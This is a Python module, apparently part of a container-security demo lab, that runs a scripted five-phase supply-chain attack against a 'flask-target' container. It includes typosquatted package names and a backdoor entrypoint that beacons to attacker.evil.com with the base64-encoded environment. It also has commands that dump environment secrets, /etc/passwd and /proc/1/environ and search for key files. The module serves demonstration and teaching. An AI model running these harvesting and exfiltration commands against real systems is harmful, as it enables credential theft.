import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_COMMANDS = [
    # phase 1: recon — image metadata and provenance
    (
        "RECON: inspect flask-target image provenance and labels",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- IMAGE PROVENANCE RECON ---'; "
            "echo '[*] Container hostname:'; hostname; "
            "echo '[*] /etc/os-release:'; cat /etc/os-release 2>/dev/null | head -5; "
            "echo '[*] Python version:'; python3 --version 2>/dev/null || echo 'no python3'; "
            "echo '[*] pip version:'; pip3 --version 2>/dev/null || pip --version 2>/dev/null || echo 'no pip'; "
            "echo '[*] Installed packages (top 20):'; pip3 list 2>/dev/null | head -20 || echo 'pip list failed'; "
            "echo '[*] Docker image labels (self-inspect via env):'; env | grep -i 'version\\|build\\|image\\|label\\|sha\\|digest' || echo 'none found'; "
            "echo '(No digest pinning observed — image identity cannot be verified)'"
        ],
    ),

    # phase 2: image spoofing / content trust check
    (
        "IMAGE SPOOFING: demonstrate lack of Content Trust and digest pinning",
        [
            "docker", "exec", "attacker",
            "sh", "-c",
            "echo '--- IMAGE TRUST CHECK ---'; "
            "echo '[*] DOCKER_CONTENT_TRUST env:'; "
            "echo ${DOCKER_CONTENT_TRUST:-'NOT SET — Content Trust DISABLED'}; "
            "echo '[*] Checking if attacker can pull unverified images:'; "
            "echo 'Without DOCKER_CONTENT_TRUST=1, any image tag can be substituted.'; "
            "echo 'Attack: replace nginx:latest with nginx:1.19.0 (known CVEs) silently.'; "
            "echo '[*] Simulating typosquatted image name check:'; "
            "echo 'Legit: python:3.11-slim'; "
            "echo 'Malicious lookalike: python:3.11-s1im (digit 1 instead of letter l)'; "
            "echo 'No registry signature check prevents this substitution.'; "
            "echo '[*] Docker Content Trust status: VULNERABLE'; "
            "echo '--- IMAGE TRUST CHECK DONE ---'"
        ],
    ),

    # phase 3: dependency tampering
    (
        "DEP TAMPERING: inject malicious package via pip (no signature check)",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- DEPENDENCY TAMPERING ---'; "
            "echo '[*] Checking pip index URL (no integrity enforcement):'; "
            "pip3 config list 2>/dev/null || echo 'default PyPI — no pinning'; "
            "echo '[*] Simulating malicious requirements.txt injection:'; "
            "echo 'requests==2.28.0  # legitimate' > /tmp/malicious_requirements.txt; "
            "echo 'setup-tools==68.0.0  # typosquat of setuptools' >> /tmp/malicious_requirements.txt; "
            "echo 'urllib4==2.0.0  # typosquat of urllib3' >> /tmp/malicious_requirements.txt; "
            "cat /tmp/malicious_requirements.txt; "
            "echo '[*] Writing fake malicious package metadata to /tmp/evil_pkg:'; "
            "mkdir -p /tmp/evil_pkg; "
            "echo '[METADATA]' > /tmp/evil_pkg/METADATA; "
            "echo 'Name: setup-tools' >> /tmp/evil_pkg/METADATA; "
            "echo 'Version: 68.0.0' >> /tmp/evil_pkg/METADATA; "
            "echo 'Author: definitely-not-malicious@evil.com' >> /tmp/evil_pkg/METADATA; "
            "echo 'Description: Totally legit setuptools replacement' >> /tmp/evil_pkg/METADATA; "
            "cat /tmp/evil_pkg/METADATA; "
            "echo '[!] No hash verification → malicious package would install silently'; "
            "echo '--- DEPENDENCY TAMPERING DONE ---'"
        ],
    ),

    # phase 4: backdoor layer injection
    (
        "BACKDOOR LAYER: write malicious script to container filesystem",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- BACKDOOR LAYER INJECTION ---'; "
            "echo '[*] Container filesystem is writable (no --read-only flag):'; "
            "mount | grep ' / ' | head -3; "
            "echo '[*] Writing fake malicious entrypoint to /usr/local/bin/docker-init:'; "
            "cat > /tmp/malicious_entrypoint.sh << 'EVIL'\n"
            "#!/bin/sh\n"
            "# Malicious layer injected via supply chain\n"
            "# This would run on every container start if added to image\n"
            "curl -s http://attacker.evil.com/beacon?host=$(hostname)&env=$(env | base64) &\n"
            "exec \"$@\"\n"
            "EVIL\n"
            "chmod +x /tmp/malicious_entrypoint.sh; "
            "echo '[*] Malicious entrypoint written:'; "
            "cat /tmp/malicious_entrypoint.sh; "
            "echo '[*] In a real supply chain attack this would be baked into the image layer'; "
            "echo '[*] Checking if /usr/local/bin is writable:'; "
            "ls -la /usr/local/bin/ | head -5; "
            "touch /usr/local/bin/supply-chain-test 2>/dev/null && "
            "echo '[!] WRITABLE — backdoor can persist across restarts' || "
            "echo '[OK] Read-only — backdoor would not persist (but image can still be poisoned upstream)'; "
            "rm -f /usr/local/bin/supply-chain-test 2>/dev/null; "
            "echo '--- BACKDOOR LAYER DONE ---'"
        ],
    ),

    # phase 5: exfiltration
    (
        "EXFILTRATION: harvest env vars and credentials from compromised container",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- SUPPLY CHAIN EXFILTRATION ---'; "
            "echo '[*] Environment variables (secrets visible in plaintext):'; "
            "env | grep -iE 'key|secret|token|password|api|db|dsn|auth|credential|private' || echo 'No obvious secrets in env'; "
            "echo '[*] Full env dump (first 30 lines):'; "
            "env | head -30; "
            "echo '[*] /etc/passwd (user accounts):'; "
            "cat /etc/passwd; "
            "echo '[*] Checking for mounted secret files:'; "
            "find / -name '*.key' -o -name '*.pem' -o -name '*.p12' -o -name 'id_rsa' -o -name '.env' 2>/dev/null | head -10 || echo 'none found'; "
            "echo '[*] /proc/1/environ (PID 1 environment — often contains all secrets):'; "
            "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -20 || echo 'not readable'; "
            "echo '[!] Supply chain attacker would exfiltrate all of the above on startup'; "
            "echo '--- EXFILTRATION DONE: SUPPLY CHAIN ATTACK COMPLETE ---'"
        ],
    ),
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for label, cmd in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] PHASE: {label}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()
        if proc.returncode not in (0, None):
            run.exit_code = proc.returncode

    run.finished_at = datetime.utcnow()
    run.exit_code = run.exit_code if run.exit_code is not None else 0
    run.status = "success" if run.exit_code == 0 else "failed"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code={run.exit_code}  duration={run.duration_seconds:.1f}s"
    )
